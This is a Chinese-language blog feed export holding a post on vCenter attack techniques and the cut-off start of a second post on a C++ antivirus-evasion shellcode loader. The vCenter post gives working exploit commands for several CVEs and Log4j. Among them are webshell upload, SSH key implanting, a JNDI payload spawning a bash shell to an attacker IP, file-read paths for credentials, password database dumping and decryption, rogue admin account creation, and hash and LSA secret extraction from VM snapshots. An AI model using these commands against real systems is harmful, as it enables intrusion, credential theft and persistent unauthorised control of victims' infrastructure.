      <title>vCenter常用攻击手法</title>
      <link href="/2022/11/22/vCenter%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
      <url>/2022/11/22/vCenter%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/sdk/</span>vimServiceVersions.xml</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x01-cve-2021-22005"><a href="#0x01-cve-2021-22005" class="headerlink" title="0x01 cve-2021-22005"></a>0x01 cve-2021-22005</h2><h3 id="1-1-影响范围："><a href="#1-1-影响范围：" class="headerlink" title="1.1 影响范围："></a>1.1 影响范围：</h3><ul><li><p>vCenter Server 7.0 &lt; 7.0 U2c build-18356314</p></li><li><p>vCenter Server 6.7 &lt; 6.7 U3o build-18485166</p></li><li><p>Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)</p></li><li><p>Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)</p><p> 6.7 vCenters Windows版本不受影响</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> .\<span class="built_in">exp</span>.<span class="keyword">py</span> -t http<span class="variable">s:</span>//<span class="number">192.168</span>.<span class="number">52.152</span> -s api_all_jdk.jsp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014622336-8dab8ce0-bc46-4016-afe2-8f4821d7db00.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=159&id=u4359cdbb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=238&originWidth=1726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42685&status=error&style=none&taskId=u706fb7ad-ac4d-49ce-ae07-836cdc7f65a&title=&width=1150.6666666666667" alt="image.png"><br>连接木马，默认路径&#x2F;storage&#x2F;db&#x2F;vmware-vmdir&#x2F;data.mdb<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014721247-a2c27eb9-6e57-4133-a64e-172d52b972cd.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=800&id=uf9dfad31&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1200&originWidth=1650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134826&status=error&style=none&taskId=u93328a43-469e-4aa2-b0af-87227c90a2d&title=&width=1100" alt="image.png"></p><h3 id="1-2-vcenter-saml-login"><a href="#1-2-vcenter-saml-login" class="headerlink" title="1.2 vcenter_saml_login"></a>1.2 vcenter_saml_login</h3><p>db数据库存放位置</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库存放路径</span><br><span class="line">Windows vCenter：<span class="string">C:</span><span class="regexp">/ProgramData/</span>VMware<span class="regexp">/vCenterServer/</span>data<span class="regexp">/vmdird/</span>data.mdb</span><br><span class="line">Linux vCenter：<span class="regexp">/storage/</span>db<span class="regexp">/vmware-vmdir/</span>data.mdb</span><br></pre></td></tr></table></figure><p>拖到本地利用：vcenter_saml_login<br>配置cmd代理，利用netch到本地127.0.0.1:1080</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">vcenter_saml_login</span><span class="selector-class">.py</span> <span class="selector-tag">-p</span> <span class="selector-tag">data</span><span class="selector-class">.mdb</span> <span class="selector-tag">-t</span> 10<span class="selector-class">.118</span><span class="selector-class">.11</span><span class="selector-class">.220</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014667035-e0e7827b-d992-407f-96d6-2bd167a03dbc.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=280&id=u0bc9599a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=1438&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63941&status=error&style=none&taskId=u88852a40-3796-45f0-b970-a6b66fcdae2&title=&width=958.6666666666666" alt="image.png"><br>修改cookie进行连接<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014858229-ccfa2893-e26e-4b44-b3d8-1892bc85f2fb.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=979&id=u810e6ad5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1468&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=483906&status=error&style=none&taskId=u9cf5e640-fd71-472e-977b-2818d83976b&title=&width=1706.6666666666667" alt="image.png"></p><h2 id="0x02-CVE-2021-21972"><a href="#0x02-CVE-2021-21972" class="headerlink" title="0x02 CVE-2021-21972"></a>0x02 CVE-2021-21972</h2><p>影响范围</p><ul><li>vCenter Server7.0 &lt; 7.0.U1c</li><li>vCenter Server6.7 &lt; 6.7.U3l</li><li>vCenter Server6.5 &lt; 6.5.U3n<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/ui/</span>vropspluginui<span class="regexp">/rest/</span>services<span class="regexp">/uploadova</span></span><br></pre></td></tr></table></figure>访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞。</li></ul><h3 id="2-1-windows机器："><a href="#2-1-windows机器：" class="headerlink" title="2.1 windows机器："></a>2.1 windows机器：</h3><p>漏洞利用： <a href="https://github.com/horizon3ai/CVE-2021-21972" target="_blank" rel="noopener">https://github.com/horizon3ai/CVE-2021-21972</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-21972.py -t x.x.x.x -p c:<span class="symbol">\\</span>ProgramData<span class="symbol">\V</span>Mware<span class="symbol">\v</span>CenterServer<span class="symbol">\d</span>ata<span class="symbol">\p</span>erfcharts<span class="symbol">\t</span>c-instance<span class="symbol">\w</span>ebapps<span class="symbol">\s</span>tatsreport<span class="symbol">\g</span>sl.jsp -o win -f gsl.jsp</span><br><span class="line"></span><br><span class="line">-t （目标地址）</span><br><span class="line">-f （上传的文件）</span><br><span class="line">-p （上传后的webshell路径，默认不用改）</span><br></pre></td></tr></table></figure><p>上传后路径</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//x.x.x.x/statsreport/gsl.jsp</span></span><br><span class="line"><span class="string">C:</span><span class="regexp">/ProgramData/</span>VMware<span class="regexp">/vCenterServer/</span>data<span class="regexp">/perfcharts/</span>tc-instance<span class="regexp">/webapps/</span>statsreport</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666943631368-67be46a7-d4ae-4f7f-989c-7d3d90165efd.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=636&id=u2f99974f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1730&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141792&status=error&style=none&taskId=u146f1450-a6cd-44a5-baa9-cba412a8694&title=&width=1153.3333333333333" alt="image.png"></p><h3 id="2-2-linux机器"><a href="#2-2-linux机器" class="headerlink" title="2.2 linux机器"></a>2.2 linux机器</h3><p>1、写公私钥（需要22端口开放）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE<span class="number">-2021</span><span class="number">-21972.</span>py -t <span class="number">10.16</span><span class="number">.8</span><span class="number">.168</span> -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f c:<span class="comment">//Users/think/.ssh/id_rsa.pub</span></span><br></pre></td></tr></table></figure><p>2、遍历写shell（时间较久）<br><a href="https://github.com/NS-Sp4ce/CVE-2021-21972" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/CVE-2021-21972</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664443620010-0610d5fc-4467-4560-af43-b147c1b7cb71.png#clientId=u04e4c8d1-ce4e-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&id=uc39792dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=949&originWidth=1891&originalType=url&ratio=1&rotation=0&showTitle=false&size=318120&status=error&style=none&taskId=u89c88664-6d75-434c-94f5-f1e6f7d82bc&title=" alt="image.png"></p><h2 id="0x03-CVE-2021-21985"><a href="#0x03-CVE-2021-21985" class="headerlink" title="0x03 CVE-2021-21985"></a>0x03 CVE-2021-21985</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -cp  JNDI-Injection-Bypass<span class="number">-1.0</span>-SNAPSHOT-all.jar payloads.EvilRMIServer <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line">nc -lvvp <span class="number">55552</span></span><br><span class="line"></span><br><span class="line">python3 cve<span class="number">-2021</span><span class="number">-21985.</span>py https:<span class="comment">//host rmi://8.8.8.8:1099/Exploit</span></span><br></pre></td></tr></table></figure><h2 id="0x04-Log4j"><a href="#0x04-Log4j" class="headerlink" title="0x04 Log4j"></a>0x04 Log4j</h2><p>${jndi:ldap:&#x2F;&#x2F;exp}</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </span>-C <span class="string">"cmd /c whoami"</span> -A <span class="string">"172.30.84.134"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </span>-C <span class="string">"bash -c &#123;echo,base编码内容&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -A <span class="string">"ip"</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666938590825-b0a1315f-9b40-41be-86cc-011aef38a4a0.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=315&id=u4b5ed440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=472&originWidth=538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59858&status=error&style=none&taskId=u039db2a0-d248-438e-8146-10e8dbb8fee&title=&width=358.6666666666667" alt="image.png"></p><h2 id="0x05-vmware未授权任意文件读取漏洞"><a href="#0x05-vmware未授权任意文件读取漏洞" class="headerlink" title="0x05 vmware未授权任意文件读取漏洞"></a>0x05 vmware未授权任意文件读取漏洞</h2><h3 id="5-1、漏洞影响版本"><a href="#5-1、漏洞影响版本" class="headerlink" title="5.1、漏洞影响版本"></a>5.1、漏洞影响版本</h3><p>已知影响版本 VMware vCenter 6.5.0a-f<br>安全版本 VMware vCenter 6.5u1</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#windows</span></span><br><span class="line">/eam/vib?<span class="attribute">id</span>=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#linux</span></span><br><span class="line">/eam/vib?<span class="attribute">id</span>=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664111112270-a885b799-b7a6-48a6-9be5-784341846266.png#clientId=u5514ee4d-e108-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&id=ubdba19ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1778&originalType=url&ratio=1&rotation=0&showTitle=false&size=187525&status=error&style=none&taskId=u70e00efe-f5f9-437b-8aae-0e46de424ba&title=" alt="image.png"></p><h2 id="0x06-vCenter低权限账户提权思路"><a href="#0x06-vCenter低权限账户提权思路" class="headerlink" title="0x06 vCenter低权限账户提权思路"></a>0x06 vCenter低权限账户提权思路</h2><h3 id="6-1、获取ssh权限后修改密码"><a href="#6-1、获取ssh权限后修改密码" class="headerlink" title="6.1、获取ssh权限后修改密码"></a>6.1、获取ssh权限后修改密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux </span></span><br><span class="line">/usr/lib/vmware-vmdir/bin/vdcadmintool </span><br><span class="line"></span><br><span class="line"><span class="comment">#Windows </span></span><br><span class="line">C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入3回车</span></span><br><span class="line"><span class="comment"># 然后输入用户名(用户名输入错误会提示：VmDirForceResetPassword failed (9106))</span></span><br><span class="line"><span class="comment"># 复制生成的新密码(新密码不能自定义，只能工具生成的)</span></span><br><span class="line">==================</span><br><span class="line">Please <span class="keyword">select</span>:</span><br><span class="line"><span class="number">0.</span> <span class="keyword">exit</span></span><br><span class="line"><span class="number">1.</span> <span class="keyword">Test</span> LDAP connectivity</span><br><span class="line"><span class="number">2.</span> <span class="keyword">Force</span> <span class="keyword">start</span> <span class="keyword">replication</span> <span class="keyword">cycle</span></span><br><span class="line"><span class="number">3.</span> <span class="keyword">Reset</span> <span class="keyword">account</span> <span class="keyword">password</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">Set</span> <span class="keyword">log</span> <span class="keyword">level</span> <span class="keyword">and</span> <span class="keyword">mask</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">Set</span> vmdir state</span><br><span class="line"><span class="number">6.</span> <span class="keyword">Get</span> vmdir state</span><br><span class="line"><span class="number">7.</span> <span class="keyword">Get</span> vmdir <span class="keyword">log</span> <span class="keyword">level</span> <span class="keyword">and</span> <span class="keyword">mask</span></span><br><span class="line">==================</span><br></pre></td></tr></table></figure><h3 id="6-2、Vmware数据库配置文件"><a href="#6-2、Vmware数据库配置文件" class="headerlink" title="6.2、Vmware数据库配置文件"></a>6.2、Vmware数据库配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># linux</span></span><br><span class="line"><span class="meta-keyword">/etc/</span>vmware-vpx/vcdb.properties</span><br><span class="line"><span class="meta-keyword">/etc/</span>vmware<span class="meta-keyword">/service-state/</span>vpxd/vcdb.properties</span><br><span class="line"></span><br><span class="line"><span class="meta"># windows</span></span><br><span class="line"><span class="symbol">C:</span>\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664177386905-d4cccd39-b526-439d-8007-139f046edbee.png#clientId=u5514ee4d-e108-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=142&id=u771bee9a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24805&status=error&style=none&taskId=u962835c6-dfcd-465d-abf5-47c35138d61&title=&width=440" alt="image.png"></p><h4 id="连接数据库，读取-vpxuser-密钥"><a href="#连接数据库，读取-vpxuser-密钥" class="headerlink" title="连接数据库，读取 vpxuser 密钥"></a>连接数据库，读取 vpxuser 密钥</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line"><span class="string">/opt/vmware/vpostgres/current/bin/psql</span> <span class="string">-h</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">-p</span> <span class="number">5432</span> <span class="string">-U</span> <span class="string">vc</span> <span class="string">-d</span> <span class="string">VCDB</span> <span class="string">-c</span> <span class="string">"select ip_address,user_name,password from vpx_host;"</span> <span class="string">&gt;</span> <span class="string">password.enc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="string">C:\Program</span> <span class="string">Files\VMware\vCenter</span> <span class="string">Server\vPostgres\bin\psql.exe</span> <span class="string">-h</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">-p</span> <span class="number">5432</span> <span class="string">-U</span> <span class="string">vc</span> <span class="string">-d</span> <span class="string">VCDB</span> <span class="string">-c</span> <span class="string">"select ip_address,user_name,password from vpx_host;"</span> <span class="string">&gt;</span> <span class="string">password.enc</span></span><br></pre></td></tr></table></figure><h3 id="6-3、获取symkey-dat文件"><a href="#6-3、获取symkey-dat文件" class="headerlink" title="6.3、获取symkey.dat文件"></a>6.3、获取symkey.dat文件</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># linux</span><br><span class="line">/etc/vmware-vpx/ssl/symkey.dat</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">C:<span class="symbol">\P</span>rogramData<span class="symbol">\V</span>Mware<span class="symbol">\v</span>CenterServer<span class="symbol">\c</span>fg<span class="symbol">\v</span>mware-vpx<span class="symbol">\s</span>sl<span class="symbol">\s</span>ymkey.dat</span><br></pre></td></tr></table></figure><h4 id="解密-vpxuser-密码"><a href="#解密-vpxuser-密码" class="headerlink" title="解密 vpxuser 密码"></a>解密 vpxuser 密码</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">decrypt</span><span class="selector-class">.py</span> <span class="selector-tag">symkey</span><span class="selector-class">.dat</span> <span class="selector-tag">password</span><span class="selector-class">.enc</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h3 id="6-4、拿到权限后添加账户"><a href="#6-4、拿到权限后添加账户" class="headerlink" title="6.4、拿到权限后添加账户"></a>6.4、拿到权限后添加账户</h3><h4 id="添加账户"><a href="#添加账户" class="headerlink" title="添加账户"></a>添加账户</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> vCenterLDAP_Manage.<span class="keyword">py</span> adduser</span><br><span class="line"><span class="built_in">input</span> the <span class="keyword">new</span> username: <span class="number">1234</span>admininput the dn: <span class="keyword">cn</span>=<span class="number">1234</span>admin,<span class="keyword">cn</span>=Users,dc=vsphere,dc=localinput the userPrincipalName: <span class="number">1234</span>admin@vsphere.local</span><br></pre></td></tr></table></figure><h4 id="提升至管理员"><a href="#提升至管理员" class="headerlink" title="提升至管理员"></a>提升至管理员</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenterLDAP_Manage.py addadmininput the<span class="built_in"> user </span>dn: <span class="attribute">cn</span>=1234admin,cn=Users,dc=vsphere,dc=local</span><br></pre></td></tr></table></figure><h3 id="0x07后续"><a href="#0x07后续" class="headerlink" title="0x07后续"></a>0x07后续</h3><h4 id="7-1、创建快照"><a href="#7-1、创建快照" class="headerlink" title="7.1、创建快照"></a>7.1、创建快照</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666945673264-ff04ef79-902d-48ea-9d44-2630c61f4644.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=695&id=uf160b882&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1043&originWidth=1711&originalType=binary&ratio=1&rotation=0&showTitle=false&size=220842&status=error&style=none&taskId=u2476fa89-caf4-4bbf-a5c0-06bc91334cc&title=&width=1140.6666666666667" alt="image.png"><br>分析快照文件需要.vmem文件作为参数，而.vmem文件通常很大，为了提高效率，这里选择将volatility上传至VMware ESXI，在VMware ESXI上分析快照文件。</p><h5 id="volatility下载：【Windows】、【Linux】"><a href="#volatility下载：【Windows】、【Linux】" class="headerlink" title="volatility下载：【Windows】、【Linux】"></a>volatility下载：【<a href="http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.exe" target="_blank" rel="noopener">Windows</a>】、【<a href="http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_standalone.zip" target="_blank" rel="noopener">Linux</a>】</h5><h3 id="7-2-volatility利用"><a href="#7-2-volatility利用" class="headerlink" title="7.2 volatility利用"></a>7.2 volatility利用</h3><h5 id="7-2-1、通过镜像信息获得系统版本，命令如下"><a href="#7-2-1、通过镜像信息获得系统版本，命令如下" class="headerlink" title="7.2.1、通过镜像信息获得系统版本，命令如下"></a>7.2.1、通过镜像信息获得系统版本，命令如下</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">volatility_2</span><span class="selector-class">.6_win64_standalone</span><span class="selector-class">.exe</span> <span class="selector-tag">-f</span> <span class="selector-tag">xxxx-Snapshot2</span><span class="selector-class">.vmem</span> <span class="selector-tag">imageinfo</span></span><br></pre></td></tr></table></figure><h5 id="7-2-2、读取profile，列出注册表内容"><a href="#7-2-2、读取profile，列出注册表内容" class="headerlink" title="7.2.2、读取profile，列出注册表内容"></a>7.2.2、读取profile，列出注册表内容</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="symbol">\v</span>olatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hivelist</span><br><span class="line"></span><br><span class="line">## 关注</span><br><span class="line">REGISTRY<span class="symbol">\M</span>ACHINE<span class="symbol">\S</span>YSTEM</span><br><span class="line">SystemRoot<span class="symbol">\S</span>ystem32<span class="symbol">\C</span>onfig<span class="symbol">\S</span>AM</span><br></pre></td></tr></table></figure><h5 id="7-2-3、使用hashdump获取hash值"><a href="#7-2-3、使用hashdump获取hash值" class="headerlink" title="7.2.3、使用hashdump获取hash值"></a>7.2.3、使用hashdump获取hash值</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility_2<span class="number">.6</span>_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hashdump -y <span class="number">0xfffff8a000024010</span> -s <span class="number">0xfffff8a000478010</span></span><br></pre></td></tr></table></figure><h5 id="7-2-4、从注册表读取LSA-Secrets"><a href="#7-2-4、从注册表读取LSA-Secrets" class="headerlink" title="7.2.4、从注册表读取LSA Secrets"></a>7.2.4、从注册表读取LSA Secrets</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility_2.<span class="number">6_</span>win64_standalone.exe -f xxx-<span class="module-access"><span class="module"><span class="identifier">Snapshot2</span>.</span></span>vmem --profile=xxx lsadump</span><br></pre></td></tr></table></figure><h5 id="7-2-5、导出所有域用户hash"><a href="#7-2-5、导出所有域用户hash" class="headerlink" title="7.2.5、导出所有域用户hash"></a>7.2.5、导出所有域用户hash</h5><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://forum.butian.net/share/1893" target="_blank" rel="noopener">https://forum.butian.net/share/1893</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vCenter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++变形免杀初探（一）</title>
      <link href="/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>好久没水文章了，最近一段时间一直在忙项目上的事情。&#x3D; &#x3D;</p><a id="more"></a><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>shellcode -&gt; 加密算法 -&gt;生成恶意加密shellcode -&gt;加载器 -&gt;解密算法 -&gt; 执行恶意shellcode</li></ul><p>利用外部库来进行加解密操作，增加分析难度，可以加base64，不过base64可能会把不可见字符转换出问题，不过两层加密基本够了，太多层反而效率变慢了。</p><h3 id="外部库"><a href="#外部库" class="headerlink" title="外部库"></a>外部库</h3><ul><li>crypto</li><li>boost</li></ul><h2 id="加密部分"><a href="#加密部分" class="headerlink" title="加密部分"></a>加密部分</h2><h3 id="异或部分"><a href="#异或部分" class="headerlink" title="异或部分"></a>异或部分</h3><p>异或和位移，可以说是复杂度最低的算法了，效率高。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_encryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; plain[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (plain[i] &gt; <span class="number">64</span> &amp;&amp; plain[i] &lt; <span class="number">91</span>)<span class="comment">//确定是字母</span></span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">90</span>) <span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span 